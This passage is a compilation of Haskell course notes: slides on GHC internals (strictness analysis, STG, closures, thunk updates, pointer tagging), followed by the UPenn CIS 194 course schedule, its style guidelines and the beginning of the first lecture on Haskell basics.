   fac x n = fac (n*x) (n-1)

-  In Haskell ``x`` & ``n`` must be represented by pointers to a
   possibly unevaluated objects (thunks)
-  Even if evaluated still represented by ‚Äúboxed‚Äù values on the heap

.. _strictness-unboxing-1:

Strictness & Unboxing
=====================

Core 

.. code:: haskell

   fac :: Int -> Int -> Int
   fac =  (x :: Int) (n :: Int) ->
       case n of _ {
         I# n# -> case n# of _
                   0#        -> x
                   __DEFAULT -> let { one = I# 1
                                      n' = n - one
                                      x' = n * x
                                    }
                                in  fac x' n'

-  We allocate thunks before the recursive call and box arguments
-  But ``fac`` will immediately evaluate the thunks and unbox the
   values!

GHC with strictness analysis
============================

Compile ``fac`` with optimizations.

.. code:: haskell

   wfac :: Int# -> Int# -> Int#
   wfac =  x# n# ->
       case n# of _
         0# -> x#
         _  -> case (n# -# 1#) of n'#
                 _ -> case (n# *# x#) of x'#
                        _ -> $wfac x'# n'#

   fac :: Int -> Int -> Int
   fac =  a n ->
       case a of
         I# a# -> case n of
                    I# n# -> case ($wfac a# n#) of
                               r# -> I# r#

-  Create an optimized ‚Äòworker‚Äô and keep original function as ‚Äòwrapper‚Äô
   to preserve interface.
-  Must preserve semantics of :math:`\bot` ‚Äì ``fac`` :math:`\bot`
   ``n = optimized(fac)`` :math:`\bot` ``n``

.. raw:: html

   <!--
   * Strictness analysis has discovered that `fac` is strict in both
     arguments
   * So creates a new 'worker' variant of `fac` that uses unboxed types
     and no thunks
   * Keeps original function `fac` though, referred to as the 'wrapper'
     to supply the correct type interface for other code.
   * As the wrapper uses unboxed types and is tail recursive, this will
     compile to a tight loop in machine code!
   -->

SpecConstr: Extending strictness analysis to paths
==================================================

The idea of the SpecConstr pass is to extend the strictness and unboxing
from before but to functions where arguments aren‚Äôt strict in every code
path.

Consider this Haskell function:

.. code:: haskell

   drop :: Int -> [a] -> [a]
   drop n []     = []
   drop 0 xs     = []
   drop n (x:xs) = drop (n-1) xs

-  Not strict in first argument:

   -  ``drop`` :math:`\bot` [] = []
   -  ``drop`` :math:`\bot` (x:xs) = :math:`\bot`

.. raw:: html

   <!--
   * Would like to pass `n` unboxed but it isn't strict in the first
     pattern. i.e:
   -->

.. _specconstr-extending-strictness-analysis-to-paths-1:

SpecConstr: Extending strictness analysis to paths
==================================================

So we get this code without extra optimization:

.. code:: haskell

   drop n xs = case xs of
                 []     -> []
                 (y:ys) -> case n of 
                             I# n# -> case n# of
                                         0 -> []
                                         _ -> let n' = I# (n# -# 1#)
                                              in drop n' ys

-  But after the first time we call drop, we are strict in ``n`` and
   always evaluate it!

SpecConstr
==========

The SpecConstr pass takes advantage of this to create a specialised
version of ``drop`` that is only called after we have passed the first
check.

.. code:: haskell

   drop n xs = case xs of
                 []     -> []
                 (y:ys) -> case n of 
                             I# n# -> case n# of
                                         0 -> []
                                         _ -> drop' (n# -# 1#) xs

   -- works with unboxed n
   drop' n# xs = case xs of
                  []     -> []
                  (y:ys) -> case n# of
                              0# -> []
                              _  -> drop (n# -# 1#) xs

-  To stop code size blowing up, GHC limits the amount of specialized
   functions it creates (specified with the ``-fspec-constr-threshol``
   and ``-fspec-constr-count`` flags).

STG Code
========

-  After Core, GHC compiles to another intermediate language called STG.

.. raw:: html

   <!--
   * In the next few slides the code Ill be showing isn't exactly Core
     but a IR GHC uses after Core called STG. (Ive cleaned up the STG
     though so its not `true` syntax)
   -->

-  STG is very similar to Core but has one nice additional property:

   -  laziness is ‚Äòexplicit‚Äô
   -  ``case`` = *evaluation* and ONLY place evaluation occurs (true in
      Core)
   -  ``let`` = *allocation* and ONLY place allocation occurs (not true
      in Core)
   -  So in STG we can explicitly see thunks being allocated for
      laziness using ``let``

-  To view STG use:

   ::

      ghc -ddump-stg A.hs > A.stg

.. _stg-code-1:

STG Code
========

Haskell 

.. code:: haskell

   map :: (a -> b) -> [a] -> [b]
   map f []     = []
   map f (x:xs) = f x : map f xs

STG

.. code:: haskell

   map :: forall a b. (a -> b) -> [a] -> [b]
   map = \r [f xs]
           case xs of _
             []     -> [] []
             : z zs -> let { bds = \u [] map f zs;
                             bd  = \u [] f z; }
                       in  : [bd bds]

-  Lambda abstraction as ``[arg1 arg2] f``
-  ``\r`` - re-entrant
-  ``\u`` - updatable (i.e., thunk)

Graph Reduction as a computational model for Haskell
====================================================

Graph reduction is a good computational model for lazy functional
languages.

.. code:: haskell

   f g = let x = 2 + 2
         in (g x, x)

.. container::

   .. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/graph.png

.. _graph-reduction-as-a-computational-model-for-haskell-1:

Graph Reduction as a computational model for Haskell
====================================================

Graph reduction is a good computational model for lazy functional
languages.

.. code:: haskell

   f g = let x = 2 + 2
         in (g x, x)

.. container::

   .. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/graph-reduced.png

.. _graph-reduction-as-a-computational-model-for-haskell-2:

Graph Reduction as a computational model for Haskell
====================================================

Graph reduction is a good computational model for lazy functional
languages.

-  Graph reduction allows lazy evaluation and sharing
-  *let*: adds new node to graph.
-  *case*: expression evaluation, causes the graph to be reduced.
-  When a node is reduced, it is replaced (or *updated*) with its result

Can think of your Haskell program as progressing by either adding new
nodes to the graph or reducing existing ones.

GHC execution model
===================

-  GHC uses closures as a unifying representation.

   -  All objects in the heap are closures.
   -  A stack frame is a closure.

-  GHC uses continuation-passing-style.

   -  Always jump to top stack frame to return.
   -  Functions will prepare stack in advance to setup call chains.

Closure Representation
======================


.. figure:: https://www.scs.stanford.edu/14sp-cs240h/slides/heap-object.png

   Closure

.. figure:: https://www.scs.stanford.edu/14sp-cs240h/slides/basic-itbl.png

   Info Table


-  Header usually just a pointer to the code and metadata for the
   closure.
-  Get away with single pointer through positive and negative offsets.
-  Payload contains the closures environment (e.g free variables,
   function arguments)

Data closure
============

.. code:: haskell

   data G = G (Int -> Int) {-# UNPACK #-} !Int

-  ``[Header | Pointers... | Non-pointers...]``
-  Payload is the values for the constructor
-  Entry code for a constructor just returns

.. code:: asm

   jmp Sp[0]

Function closures
=================

.. code:: haskell

   f = \x -> let g = \y -> x + y
             in g x

-  [Header \| Pointers‚Ä¶ \| Non-pointers‚Ä¶]
-  Payload is the bound free variables, e.g.,

   -  ``[ &g | x ]``

-  Entry code is the function code

Partial application closures (PAP)
==================================

.. code:: haskell

   foldr (:)

-  ``[Header | Arity | Payload size | Function | Payload]``
-  Arity of the PAP (function of arity 3 with 1 argument applied gives
   PAP of arity 2)
-  Function is the closure of the function that has been partially
   applied

.. raw:: html

   <!--
   * PAPs should never be entered so the entry code is some failure
     code
   -->

Thunk closures
==============

.. code:: haskell

   range = [1..100]

-  ``[Header | Pointers... | Non-pointers...]``
-  Payload contains the free variables of the expression
-  Differ from function closure in that they can be updated
-  Entry code is the code for the expression

Calling convention
==================

-  On X86 32bit - all arguments passed on stack

-  On X86 64bit - first 5 arguments passed in registers, rest on stack

-  ``R1`` register in Cmm code usually is a pointer to the current
   closure (i.e., similar to ``this`` in OO languages).

Handling thunk updates
======================

-  Thunks once evaluated should update their node in the graph to be the
   computed value.

-  GHC uses a *self-updating-model* ‚Äì code unconditionally jumps to a
   thunk. Up to thunk to update itself, replacing code with value.

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/graph-reduced.png

.. _handling-thunk-updates-1:

Handling thunk updates
======================

.. code:: haskell

   mk :: Int -> Int
   mk x = x + 1

.. code:: c

   // thunk entry - setup stack, evaluate x
   mk_entry()
       entry:
           if (Sp - 24 < SpLim) goto gc;

           I64[Sp - 16] = stg_upd_frame_info;  // setup update frame (closure type)
           I64[Sp -  8] = R1;                  // set thunk to be updated (payload)

           I64[Sp - 24] = mk_exit;             // setup continuation (+) continuation

           Sp = Sp - 24;                       // increase stack
           R1 = I64[R1 + 8];                   // grab 'x' from environment
           jump I64[R1] ();                    // eval 'x'

       gc: jump stg_gc_enter_1 ();
   }

.. _handling-thunk-updates-2:

Handling thunk updates
======================

.. code:: haskell

   mk :: Int -> Int
   mk x = x + 1

.. code:: c

   // thunk exit - setup value on heap, tear-down stack
   mk_exit()
       entry:
           Hp = Hp + 16;
           if (Hp > HpLim) goto gc;

           v::I64 = I64[R1] + 1;               // perform ('x' + 1)

           I64[Hp - 8] = GHC_Types_I_con_info; // setup Int closure
           I64[Hp + 0] = v::I64;               

           R1 = Hp;                            // point R1 to computed thunk value
           Sp = Sp + 8;                        // pop stack
           jump (I64[Sp + 0]) ();              // jump to continuation ('stg_upd_frame_info')

       gc: HpAlloc = 16;
           jump stg_gc_enter_1 ();
   }

stg_upd_frame_info code updates a thunk with its value
======================================================

-  To update a thunk with its value we need to change its header
   pointer.

-  Should point to code that simply returns now.

-  Payload also now needs to include the value.

-  Naive solution would be to synchronize on every thunk access.

-  But we don‚Äôt need to! Races on thunks are fine since we can rely on
   purity. Races just leads to duplication of work.

.. _stg_upd_frame_info-code-updates-a-thunk-with-its-value-1:

stg_upd_frame_info code updates a thunk with its value
======================================================

Thunk closure:

-  ``[Header | Payload]``

-  ``Header`` = ``[ Info Table Pointer | Result Slot ]``

-  Result slot empty when thunk unevaluated.

-  Update code, first places result in result slot and secondly changes
   the info table pointer.

-  Safe to do without synchronization (need write barrier) on all
   architectures GHC supports.

Avoiding entering values
========================

-  Evaluation model is we always enter a closure, even values.

-  This is poor for performance, we prefer to avoid entering values
   every single time.

-  An optimization that GHC does is *pointer tagging*. The trick is to
   use the final bits of a pointer which are usually zero (last 2 for
   32bit, 3 on 64) for storing a ‚Äòtag‚Äô.

-  GHC uses this tag for:

   -  If the object is a constructor, the tag contains the constructor
      number (if it fits)
   -  If the object is a function, the tag contains the arity of the
      function (if it fits)

.. _avoiding-entering-values-1:

Avoiding entering values
========================

Our example code from before:

.. code:: haskell

   mk :: Int -> Int
   mk x = x + 1

Changes with pointer tagging:

.. code:: c

   mk_entry()
       entry:
            ...
            R1 = I64[R1 + 16];          // grab 'x' from environment
            if (R1 & 7 != 0) goto cxd;  // check if 'x' is eval'd
            jump I64[R1] ();            // not eval'd so eval
       cxd: jump mk_exit ();            // 'x' eval'd so jump to (+) continuation
   }

   mk_exit()
       cx0:
           I64[Hp - 8] = ghczmprim_GHCziTypes_Izh_con_info; // setup Int closure
           I64[Hp + 0] = v::I64;               // setup Int closure
           R1 = Hp - 7;                        // point R1 to computed thunk value (with tag)
           ...
   }

Pointer tagging makes your own data types efficient
===================================================

-  If the closure is a constructor, the tag contains the constructor
   number (if it fits).

.. code:: haskell

   data MyBool a = MTrue a | MFalse a

-  Will be as efficient as using an ``Int#`` for representing true and
   false.




===================================================
/. üöÄ University of Pennsylvania's CIS 194
===================================================
-  `University of Pennsylvania's CIS 194 <https://www.seas.upenn.edu/~cis1940/spring13/>`__

GHCi Âíå Hugs ÂèØ‰ª•Ëß£ÊûêÊâ©Â±ïÂêç‰∏∫ .hs Âíå .lhs ÁöÑÊñá‰ª∂„ÄÇ ÂÖ∂‰∏≠ .lhsÔºàliterate Haskell scriptÔºâ
Êñá‰ª∂ÊòØÂê´Â≠óÈù¢ÈáèÊñáÊú¨ÁöÑËÑöÊú¨ÊñáÊ°£ÔºåÂÖ∂‰∏≠ÂåÖÂê´ÊúâÊïàÁ®ãÂ∫è‰ª£Á†ÅÔºåÂèØ‰ª•Áî®Â§ß‰∫éÂè∑Ôºà>ÔºâÂíåÁ©∫Ê†ºÂºÄÂ§¥„ÄÇ ÊØîÂ¶ÇÔºö
::

   add :: Int -> Int -> Int 
   add x y = x + y

ÂÖ∂ÂÆÉÁ¨¶Âè∑ÂºÄÂ§¥ÁöÑÂÜÖÂÆπÂ∞ÜË¢´ËßÜ‰ΩúÊ≥®ÈáäÂ§ÑÁêÜÔºå‰∏îÊ≥®Èáä‰∏é‰ª£Á†ÅÈó¥ÂøÖÈ°ªÊúâ‰∏ÄË°å‰ª•‰∏äÁöÑÈó¥Èöî„ÄÇ ËøòÊúâ‰∏Ä‰∫õ .lhs Êñá‰ª∂‰∏≠ÁöÑ 
‰ª£Á†Å‰ª• begin {code} ‰ª• end {code} ÁªìÂ∞æ„ÄÇÂ¶ÇÊûú .lhs Êñá‰ª∂ÈÅµÂÆà‰∏ÄÂÆöÁöÑÊ†ºÂºèÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî® lhs2tex 
Â∑•ÂÖ∑ÁîüÊàêÈùûÂ∏∏Á≤æÁæéÁöÑÊñáÊ°£‰ª•‰æõ‰∫∫‰ª¨ÈòÖËØª„ÄÇ

.. container::
   :name: canvas

   .. container::
      :name: content

      All homework assignments should emerge creatively from the `Style
      guidelines <docs/style.pdf>`__. Homework is due each Monday **by
      the start of class**.

      `HW submission site <http://cis194.herokuapp.com/>`__ / `HW
      submission instructions <submission/hwsubmission.html>`__

      -  Week 1 (14 January): 
         `Introduction to Haskell <https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.lhs>`__ )

         -  `Homework 1 <https://www.seas.upenn.edu/~cis1940/spring13/hw/01-intro.pdf>`__: due Monday, 21 January.

      -  Week 2 (21 January): 
         `Algebraic Data Types <https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.lhs>`__ )

         -  `Homework 2 <https://www.seas.upenn.edu/~cis1940/spring13/hw/02-ADTs.pdf>`__: due Monday, 28 January. [
            `error.log <https://www.seas.upenn.edu/~cis1940/spring13/extras/02-ADTs/error.log>`__,
            `sample.log <https://www.seas.upenn.edu/~cis1940/spring13/extras/02-ADTs/sample.log>`__,
            `Log.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/02-ADTs/Log.hs>`__ ]

      -  Week 3 (28 January): 
         `Recursion patterns, polymorphism, and the Prelude <https://www.seas.upenn.edu/~cis1940/spring13/lectures/03-rec-poly.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/03-rec-poly.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/03-rec-poly.lhs>`__ )

         -  `Homework 3 <https://www.seas.upenn.edu/~cis1940/spring13/hw/03-rec-poly.pdf>`__: due Monday, 4 February.

      -  Week 4 (4 February): 
         `Higher-order programming and type inference <https://www.seas.upenn.edu/~cis1940/spring13/lectures/04-higher-order.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/04-higher-order.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/04-higher-order.lhs>`__ )

         -  `Homework 4 <https://www.seas.upenn.edu/~cis1940/spring13/hw/04-higher-order.pdf>`__: due Monday, 11
            February.

      -  Week 5 (11 February): 
         `More polymorphism and type classes <https://www.seas.upenn.edu/~cis1940/spring13/lectures/05-type-classes.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/05-type-classes.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/05-type-classes.lhs>`__ )

         -  `Homework 5 <https://www.seas.upenn.edu/~cis1940/spring13/hw/05-type-classes.pdf>`__: due Monday, 18
            February. [ `ExprT.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/05-type-classes/ExprT.hs>`__,
            `Parser.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/05-type-classes/Parser.hs>`__,
            `StackVM.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/05-type-classes/StackVM.hs>`__ ]

      -  Week 6 (18 February): 
         `Lazy evaluation <https://www.seas.upenn.edu/~cis1940/spring13/lectures/06-laziness.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/06-laziness.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/06-laziness.lhs>`__ )

         -  `Homework 6 <https://www.seas.upenn.edu/~cis1940/spring13/hw/06-laziness.pdf>`__: due Monday, 25
            February.

      -  Week 7 (25 February): 
         `Folds and monoids <https://www.seas.upenn.edu/~cis1940/spring13/lectures/07-folds-monoids.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/07-folds-monoids.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/07-folds-monoids.lhs>`__ )

         -  `Homework 7 <https://www.seas.upenn.edu/~cis1940/spring13/hw/07-folds-monoids.pdf>`__: due Monday, 11
            March. [ `Editor.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/Editor.hs>`__,
            `Buffer.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/Buffer.hs>`__,
            `Sized.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/Sized.hs>`__,
            `StringBuffer.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/StringBuffer.hs>`__,
            `StringBufEditor.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/StringBufEditor.hs>`__,
            `carol.txt <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/carol.txt>`__ ]

      -  Week 8 (11 March): 
         `IO <https://www.seas.upenn.edu/~cis1940/spring13/lectures/08-IO.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/08-IO.html>`__, `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/08-IO.lhs>`__ )

         -  `Homework 8 <https://www.seas.upenn.edu/~cis1940/spring13/hw/08-IO.pdf>`__: due Monday, 18 March. [
            `Employee.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/08-IO/Employee.hs>`__,
            `company.txt <https://www.seas.upenn.edu/~cis1940/spring13/extras/08-IO/company.txt>`__ ]

      -  Week 9 (18 March): 
         `Functors <https://www.seas.upenn.edu/~cis1940/spring13/lectures/09-functors.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/09-functors.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/09-functors.lhs>`__ )

         -  `Homework 9 <https://www.seas.upenn.edu/~cis1940/spring13/hw/09-functors.pdf>`__: due never (no HW this
            week).

      -  Week 10 (25 March): 
         `Applicative functors (part 1) <https://www.seas.upenn.edu/~cis1940/spring13/lectures/10-applicative.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/10-applicative.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/10-applicative.lhs>`__ )

         -  `Homework 10 <https://www.seas.upenn.edu/~cis1940/spring13/hw/10-applicative.pdf>`__: due Monday, 1
            April. [ `AParser.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/10-applicative/AParser.hs>`__ ]

      -  Week 11 (1 April): 
         `Applicative functors (part 2) <https://www.seas.upenn.edu/~cis1940/spring13/lectures/11-applicative2.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/11-applicative2.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/11-applicative2.lhs>`__ )

         -  `Homework 11 <https://www.seas.upenn.edu/~cis1940/spring13/hw/11-applicative2.pdf>`__: due Monday, 8
            April. [ `AParser.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/AParser.hs>`__,
            `SExpr.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/SExpr.hs>`__ ]

      -  Week 12 (8 April): 
         `Monads <https://www.seas.upenn.edu/~cis1940/spring13/lectures/12-monads.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/12-monads.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/12-monads.lhs>`__ )

         -  `Homework 12 <https://www.seas.upenn.edu/~cis1940/spring13/hw/12-monads.pdf>`__: due Monday, 15 April. [`Risk.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/12-monads/Risk.hs>`__ ]



Good Haskell Style

https://www.seas.upenn.edu/~cis1940/spring13/docs/style.pdf

All your submitted programming assignments should emerge creatively
from the following style guidelines. Programming is just as much social art
form as it is engineering discipline, and as any artist knows, constraints serve
to enhance rather than quench creativity.

These guidelines will be extended as the semester progresses.


‚Ä¢ DO use camelCase for function and variable names.

‚Ä¢ DO use descriptive function names, which are as long as they need to
     be but no longer than they have to be. Good: solveRemaining. Bad:
     slv. Ugly: solveAllTheCasesWhichWeHaven‚ÄôtYetProcessed.

‚Ä¢ DON‚ÄôT use tab characters. Haskell is layout-sensitive and tabs Mess
     Everything Up. I don‚Äôt care how you feel about tabs when coding in
     other languages. Just trust me on this one. Note this does not mean
     you need to hit space a zillion times to indent each line; your Favorite
     Editor ought to support auto-indentation using spaces instead of tabs.

‚Ä¢ DO try to keep every line under 80 characters. This isn‚Äôt a hard and
     fast rule, but code that is line-wrapped by an editor looks horrible.

‚Ä¢ DO give every top-level function a type signature. Type signatures
     enhance documentation, clarify thinking, and provide nesting sites for
     endangered bird species. Top-level type signatures also result in better
     error messages. With no type signatures, type errors tend to show up
     far from where the real problem is; explicit type signatures help localize
     type errors.

     Locally defined functions and constants (part of a let expression or
     where clause) do not need type signatures, but adding them doesn‚Äôt
     hurt (in particular, the argument above about localizing type errors
     still applies).

‚Ä¢ DO precede every top-level function by a comment explaining what it does.

‚Ä¢ DO use -Wall. Either pass -Wall to ghc on the command line, or (easier) put::

    {-# OPTIONS_GHC -Wall #-}

     at the top of your .hs file. All your submitted programs should compile
     with no warnings.

‚Ä¢ DO, as much as possible, break up your programs into small functions
     that do one thing, and compose them to create more complex functions.

‚Ä¢ DO make all your functions total. That is, they should give sensible
     results (and not crash) for every input.

/CS194 Lectures 01 Haskell Basics
=================================

- https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.lhs
- https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.html

<!--
{-# OPTIONS_GHC -Wall #-}
-->


CIS 194 Week 1  
14 January 2013

Suggested reading: 

-   [Learn You a Haskell for Great Good, chapter 2](http://learnyouahaskell.com/starting-out)
-   [Real World Haskell](http://book.realworldhaskell.org/),
    chapters 1 and 2

What is Haskell?
----------------

Haskell is a *lazy, functional* programming language created in the
late 1980's by a committee of academics.  There were a plethora of
lazy functional languages around, everyone had their favorite, and it
was hard to communicate ideas.  So a bunch of people got together and
designed a new language, taking some of the best ideas from existing
languages (and a few new ideas of their own).  Haskell was born.

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/haskell-logo-small.png

So what is Haskell like?  Haskell is:

**Functional**

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/function-machine.png
   :width: 200px

There is no precise, accepted meaning for the term "functional".
But when we say that Haskell is a *functional* language, we usually
have in mind two things:

* Functions are *first-class*, that is, functions are values which can
  be used in exactly the same ways as any other sort of value.

* The meaning of Haskell programs is centered around *evaluating
  expressions* rather than *executing instructions*.

Taken together, these result in an entirely different way of thinking about
programming.  Much of our time this semester will be spent exploring
this way of thinking.

**Pure** 

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/pure.jpg
   :width: 200px

Haskell expressions are always *referentially transparent*, that is:

* No mutation!  Everything (variables, data structures...) is *immutable*.

* Expressions never have "side effects" (like updating global variables or
  printing to the screen).

* Calling the same function with the same arguments results in
  the same output every time.

This may sound crazy at this point.  How is it even possible to get
anything done without mutation or side effects?  Well, it certainly
requires a shift in thinking (if you're used to an imperative or
object-oriented paradigm).  But once you've made the shift, there are
a number of wonderful benefits:

* *Equational reasoning and refactoring*: In Haskell one can always
  "replace equals by equals", just like you learned in algebra class.

* *Parallelism*: Evaluating expressions in parallel is easy when they
  are guaranteed not to affect one another.

* *Fewer headaches*: Simply put, unrestricted effects and
  action-at-a-distance makes for programs that are hard to debug,
  maintain, and reason about.

**Lazy**

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/relax.jpg
   :width: 200px

In Haskell, expressions are *not evaluated until their results are
actually needed*.  This is a simple decision with far-reaching
consequences, which we will explore throughout the semester.  Some of
the consequences include:

* It is easy to define a new *control structure* just by defining a
  function.

* It is possible to define and work with *infinite data structures*.

* It enables a more compositional programming style (see *wholemeal
  programming* below).

* One major downside, however, is that reasoning about time and space
  usage becomes much more complicated!

**Statically typed**

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/static.jpg
   :width: 200px

Every Haskell expression has a type, and types are all checked at
*compile-time*.  Programs with type errors will not even compile, much
less run.

Themes
------

Throughout this course, we will focus on three main themes.

**Types**

Static type systems can seem annoying.  In fact, in languages like C++
and Java, they *are* annoying.  But this isn't because static type
systems *per se* are annoying; it's because C++ and Java's type
systems are insufficiently expressive! This semester we'll take a
close look at Haskell's type system, which

* *Helps clarify thinking and express program structure*

    The first step in writing a Haskell program is usually to *write
    down all the types*.  Because Haskell's type system is so expressive,
    this is a non-trivial design step and is an immense help in
    clarifying one's thinking about the program.

* *Serves as a form of documentation*

    Given an expressive type system, just looking at a function's type
    tells you a lot about what the function might do and how it can be
    used, even before you have read a single word of written documentation.

* *Turns run-time errors into compile-time errors*

    It's much better to be able to fix errors up front than to just
    test a lot and hope for the best.  "If it compiles, it must be
    correct" is mostly facetious (it's still quite possible to have errors
    in logic even in a type-correct program), but it happens in Haskell
    much more than in other languages.

**Abstraction**

"Don't Repeat Yourself" is a mantra often heard in the world of
programming.  Also known as the "Abstraction Principle", the idea is
that nothing should be duplicated: every idea, algorithm, and piece of
data should occur exactly once in your code.  Taking similar pieces of
code and factoring out their commonality is known as the process of
*abstraction*.

Haskell is very good at abstraction: features like parametric
polymorphism, higher-order functions, and type classes all aid in the
fight against repetition.  Our journey through Haskell this semester
will in large part be a journey from the specific to the abstract.

**Wholemeal programming**

Another theme we will explore is *wholemeal programming*. A quote from
Ralf Hinze::

   "Functional languages excel at wholemeal programming, a term coined by
   Geraint Jones. Wholemeal programming means to think big: work with an
   entire list, rather than a sequence of elements; develop a solution
   space, rather than an individual solution; imagine a graph, rather
   than a single path. The wholemeal approach often offers new insights
   or provides new perspectives on a given problem. It is nicely
   complemented by the idea of projective programming: first solve a more
   general problem, then extract the interesting bits and pieces by
   transforming the general program into more specialised ones."

For example, consider this pseudocode in a C/Java-ish sort of language::

    int acc = 0;
    for ( int i = 0; i < lst.length; i++ ) {
      acc = acc + 3 * lst[i];
    }

This code suffers from what Richard Bird refers to as "indexitis": it
has to worry about the low-level details of iterating over an array by
keeping track of a current index.  It also mixes together what can
more usefully be thought of as two separate operations: multiplying
every item in a list by 3, and summing the results.

In Haskell, we can just write 

    sum (map (3*) lst)

This semester we'll explore the shift in thinking represented by this
way of programming, and examine how and why Haskell makes
it possible.

Literate Haskell
----------------

This file is a "literate Haskell document": only lines preceded by
> and a space (see below) are code; everything else (like this
paragraph) is a comment. Your programming assignments do not have
to be literate Haskell, although they may be if you like. Literate
Haskell documents have an extension of `.lhs`, whereas non-literate Haskell
source files use `.hs`.

Declarations and variables
--------------------------

Here is some Haskell code:"" 

   > x :: Int
   > x = 3
   > 
   > -- Note that normal (non-literate) comments are preceded by two hyphens
   > {- or enclosed
   >    in curly brace/hyphen pairs. -}

The above code declares a variable `x` with type `Int` (`::` is
pronounced "has type") and declares the value of `x` to be `3`. Note
that *this will be the value of `x` forever* (at least, in this
particular program). The value of `x` cannot be changed later.

Try uncommenting the line below; it will generate an error saying
something like ``Multiple declarations of `x'``.

> -- x = 4

In Haskell, *variables are not mutable boxes*; they are just names
for values!

Put another way, `=` does *not* denote "assignment" like it does in
many other languages. Instead, `=` denotes *definition*, like it does
in mathematics.  That is, `x = 4` should not be read as "`x` gets `4`"
or "assign `4` to `x`", but as "`x` is *defined to be* `4`".

What do you think this code means? ::

   > y :: Int
   > y = y + 1

Basic Types
-----------

   > -- Machine-sized integers
   > i :: Int
   > i = -78

`Int`s are guaranteed by the Haskell language standard to accommodate
values at least up to \\(\\pm 2^{29}\\), but the exact size depends on
your architecture.  For example, on my 64-bit machine the range is
\\(\\pm 2^{63}\\). You can find the range on your machine by
evaluating the following::

   > biggestInt, smallestInt :: Int
   > biggestInt  = maxBound
   > smallestInt = minBound

(Note that idiomatic Haskell uses `camelCase` for identifier names.
If you don't like it, tough luck.)

The `Integer` type, on the other hand, is limited only by the amount
of memory on your machine.::

   > -- Arbitrary-precision integers
   > n :: Integer
   > n = 1234567890987654321987340982334987349872349874534
   >
   > reallyBig :: Integer
   > reallyBig = 2^(2^(2^(2^2)))
   >
   > numDigits :: Int
   > numDigits = length (show reallyBig)

For floating-point numbers, there is `Double`::

   > -- Double-precision floating point
   > d1, d2 :: Double
   > d1 = 4.5387
   > d2 = 6.2831e-4

There is also a single-precision floating point number type, `Float`.

Finally, there are booleans, characters, and strings::

   > -- Booleans
   > b1, b2 :: Bool
   > b1 = True
   > b2 = False
   > 
   > -- Unicode characters
   > c1, c2, c3 :: Char
   > c1 = 'x'
   > c2 = '√ÉÀú'
   > c3 = '√£∆í‚Ç¨'
   > 
   > -- Strings are lists of characters with special syntax
   > s :: String
   > s = "Hello, Haskell!"

GHCi
----

GHCi is an interactive Haskell REPL (Read-Eval-Print-Loop) that comes
with GHC. At the GHCi prompt, you can evaluate expressions, load
Haskell files with `:load` (`:l`) (and reload them with `:reload`
(`:r`)), ask for the type of an expression with `:type` (`:t`), and
many other things (try `:?` for a list of commands).

Arithmetic
----------

Try evaluating each of the following expressions in GHCi::

   > ex01 = 3 + 2
   > ex02 = 19 - 27
   > ex03 = 2.35 * 8.6
   > ex04 = 8.7 / 3.1
   > ex05 = mod 19 3
   > ex06 = 19 `mod` 3
   > ex07 = 7 ^ 222
   > exNN = (-3) * (-7)

Note how \`backticks\` make a function name into an infix
